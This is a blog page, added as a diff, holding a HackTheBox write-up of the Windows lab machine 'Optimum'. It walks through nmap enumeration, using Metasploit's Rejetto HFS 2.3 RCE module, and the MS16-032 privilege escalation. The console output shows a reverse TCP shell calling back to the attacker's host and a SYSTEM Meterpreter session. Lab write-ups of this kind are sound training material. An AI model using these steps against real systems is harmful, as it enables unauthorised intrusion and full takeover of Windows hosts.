@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Optimum :: dim1119&#39;s Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Windows - Easy Machine" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/hackthebox/optimum/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="/img/favicon/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Optimum">
+<meta property="og:description" content="Windows - Easy Machine" />
+<meta property="og:url" content="/hackthebox/optimum/" />
+<meta property="og:site_name" content="dim1119&#39;s Blog" />
+
+  
+    <meta property="og:image" content="/img/favicon/orange.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2021-04-07 22:18:38 &#43;0300 EEST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="orange">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Home
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about/index.html">About me</a></li>
+        
+      
+        
+          <li><a href="/ctf/index.html">CTF</a></li>
+        
+      
+        
+          <li><a href="/hackthebox/index.html">HackTheBox</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about/index.html">About me</a></li>
+      
+    
+      
+        <li><a href="/ctf/index.html">CTF</a></li>
+      
+    
+      
+        <li><a href="/hackthebox/index.html">HackTheBox</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/hackthebox/optimum/">Optimum</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2021-04-07 
+      </span>
+    
+    
+  </div>
+
+  
+
+  
+
+  
+
+  <div class="post-content"><div>
+        <p><img src="/htb/c5021f498be742e184c38de0d3857748.png" alt="5db61c655fe06715d59df62dc577ebc5.png"></p>
+<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Lets start with nmap:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -A 10.129.48.247                                                                         <span style="color:#ae81ff">1</span> ⨯
+Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-03-05 17:15 EST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.129.48.247
+Host is up <span style="color:#f92672">(</span>0.079s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">999</span> filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 16.99 seconds
+</code></pre></div><p>Only port 80 is open.</p>
+<p><img src="/htb/c87ad1a688a64f87b994fa6bf45d4aa1.png" alt="b524be7736e8e8b271d44ec03b76c636.png"></p>
+<h1 id="exploiting-the-web-server">Exploiting the web server<a href="#exploiting-the-web-server" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>The website seems to be running Rejetto HttpFileServer 2.3, which is vulnerable to <a href="https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/">RCE</a>.</p>
+<p>After setting the correct parameters we get a shell and the user flag.
+<img src="/htb/ce4c3ae7d004424b81b42717068ff35e.png" alt="55a98f1176cb29adb1ac7a627e1fd4b0.png"></p>
+<h1 id="privelege-escalation">Privelege Escalation<a href="#privelege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Lets enumerate to achieve privilege escalation.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; sysinfo 
+Computer        : OPTIMUM
+OS              : Windows <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>6.3 Build 9600<span style="color:#f92672">)</span>.
+Architecture    : x64
+System Language : el_GR
+Domain          : HTB
+Logged On Users : <span style="color:#ae81ff">1</span>
+Meterpreter     : x86/windows
+</code></pre></div><p>The architecture is x64 and the os is windows 2012 r2. Local exploit suggester works best at x86 architectures but lets try it. After putting session 1 in the background run
+<code>multi/recon/local_exploit_suggester</code> .</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>windows/local/ms16_032_secondary_logon_handle_privesc<span style="color:#f92672">)</span> &gt; use post/multi/recon/local_exploit_suggester 
+msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; set session <span style="color:#ae81ff">1</span>
+session <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; run
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.48.247 - Collecting local exploits <span style="color:#66d9ef">for</span> x86/windows...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.48.247 - <span style="color:#ae81ff">37</span> exploit checks are being tried...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.48.247 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.48.247 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Post module execution completed
+</code></pre></div><p>The second module worked (<code>windows/local/ms16_032_secondary_logon_handle_privesc</code>):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sf6 exploit<span style="color:#f92672">(</span>windows/local/ms16_032_secondary_logon_handle_privesc<span style="color:#f92672">)</span> &gt; exploit
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.129:4444 
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Compressed size: <span style="color:#ae81ff">1016</span>
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Writing payload file, C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\k</span>ostas<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\Z</span>IcuZP.ps1...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Compressing script contents...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Compressed size: <span style="color:#ae81ff">3592</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing exploit script...
+     __ __ ___ ___   ___     ___ ___ ___ 
+    |  V  |  _|_  | |  _|___|   |_  |_  |
+    |     |_  |_| |_| . |___| | |_  |  _|
+    |_|_|_|___|_____|___|   |___|___|___|
+                                        
+                   <span style="color:#f92672">[</span>by b33f -&gt; @FuzzySec<span style="color:#f92672">]</span>
+
+<span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> Operating system core count: <span style="color:#ae81ff">2</span>
+<span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Duplicating CreateProcessWithLogonW handle
+<span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> Done, using thread handle: <span style="color:#ae81ff">1832</span>
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sniffing out privileged impersonation token..
+
+<span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> Thread belongs to: svchost
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Thread suspended
+<span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Wiping current impersonation token
+<span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Building SYSTEM impersonation token
+<span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> Success, open SYSTEM token handle: <span style="color:#ae81ff">2248</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Resuming thread..
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sniffing out SYSTEM shell..
+
+<span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Duplicating SYSTEM token
+<span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Starting token race
+<span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Starting process race
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Holy handle leak Batman, we have a SYSTEM shell!!
+
+MMHBHpbo933bF0v8HT8NeeJN2sTMQfEm
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Executed on target machine.
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175174</span> bytes<span style="color:#f92672">)</span> to 10.129.48.247
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>10.10.14.129:4444 -&gt; 10.129.48.247:49164<span style="color:#f92672">)</span> at 2021-03-05 17:36:56 -0500
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\k</span>ostas<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\Z</span>IcuZP.ps1
+</code></pre></div><p>Finally we get shell as root and the root flag:
+<img src="/htb/5e2538c20aa14a8e91a119346d6fe785.png" alt="1a800bffcd5b68cfc2c6bd09b0756010.png"></p>
+
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2021 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
